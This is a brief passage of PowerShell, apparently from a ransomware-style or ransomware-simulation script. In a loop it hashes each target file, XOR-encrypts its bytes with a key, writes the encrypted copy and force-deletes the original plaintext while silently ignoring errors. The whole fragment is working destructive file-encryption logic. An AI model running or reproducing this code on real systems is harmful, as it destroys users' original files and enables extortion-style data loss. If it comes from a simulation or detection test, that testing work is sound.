          if (-not (Test-Path $plain)) { continue }
          $created++
          $origHash = (Get-FileHash -Path $plain -Algorithm SHA256).Hash
          $bytes = [System.IO.File]::ReadAllBytes($plain)
          $out = New-Object byte[] $bytes.Length
          for ($b = 0; $b -lt $bytes.Length; $b++) { $out[$b] = $bytes[$b] -bxor $key }
          try { [System.IO.File]::WriteAllBytes($enc, $out); Remove-Item $plain -Force } catch { }
          if (Test-Path $enc) {
